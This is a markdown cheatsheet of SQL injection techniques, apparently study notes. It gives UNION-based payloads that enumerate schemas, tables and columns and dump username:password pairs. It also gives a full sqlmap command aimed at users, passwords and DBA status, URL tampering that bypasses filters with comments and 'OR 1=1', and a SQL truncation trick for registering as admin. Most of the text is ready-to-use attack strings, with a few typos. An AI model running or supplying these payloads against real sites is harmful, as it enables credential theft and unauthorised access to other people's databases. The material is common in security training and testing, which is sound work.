# SQL Injection cheatsheet and examples

- If the input field allows injection with ' 
```
# inside the search field 
admin' UNION SELECT 1,2,3,4,5,6 -- -
```
  - trying the 1,2,3.. sequence till we get a proper result and that covers all the columns 

  - To find the database being used
  ```
  # databse() displays the database in use
  SELECT 1,2,3,4,5,databse() -- -
  ```

  - To list all the databases
  ```
  SELECT 1,2,3,4,5,SCHEMA_NAME from information_schema.schemata-- -
  ```
  
  - To list all the tables present in a particular database
  ```
  SELECT 1,2,3,4,5,table_name from information_schema.tables-- -
  # to filter the results based on the schema for the data
  SELECT 1,2,3,4,5,table_name from information_schema.tables where table_schema='Staff'-- -
  ```

  - Displaying the database schema
  ```
  # group_concat() is used to display multiple results in a single field
  SELECT group_concat(table_name, ":", column_name),2,3,4,5,6 FROM information_schema.columns where table_schema='Staff'-- -
  ```
  
  - extracting details like username and password 
  ```
  # Syntax: ... FROM <database_name>.<table_name>
  SELECT group_concat(username, ":", password)2,3,4,5,6 FROM Staff.users-- -
  ```

```
1' ORDER BY 10#

1' UNION SELECT version(),2#

1' UNION SELECT version(),database()#

1' UNION SELECT version(),user()#

1' UNION ALL SELECT table_name,2 from information_schema.tables#

1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#

1' UNION ALL SELECT concat(user,char(58),password),2 from users#
```

### Using SQLmap 

```
sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --so=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### Retrieving hidden data

**Example** 

https://website.com/products?category=gifts may be running a query something like `SELECT * FROM products WHERE category = 'gifts` AND released = 1 
- This query is filtering data based on the 'released' property, adding -- after 'gifts' will end the statement there.

```
https://website.com/prooducts?category=gifts'--
SELECT * FROM products WHERE category = 'gifts'--' AND released = 1

similarly, 
https://website.com/products?category=gifts'+OR+1=1+-- 
SELECT * FROM products WHERE category = 'gifts' OR 1=1 --' AND released = 1 
```

### Examining database 

```
SELECT * FROM v$version
SELECT * FROM information_schema.tables
```


```javascript
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
```

- So this script shows that our inputs in the fields should be limited by the set number of characters. What if we give a longer input? It will get truncated. This is known as SQL Truncation Attack

- So if we create an account with a name like "admin      hello", the script will truncate all characters after the 10th. And so our name becomes admin, and we could run admin on the site. The form must allow spaces in the name for this. We check for that and find that we can in fact input spaces.
 
- The site seems to be making a client side email validation, so we can intercept the post request and change the request params accordingly
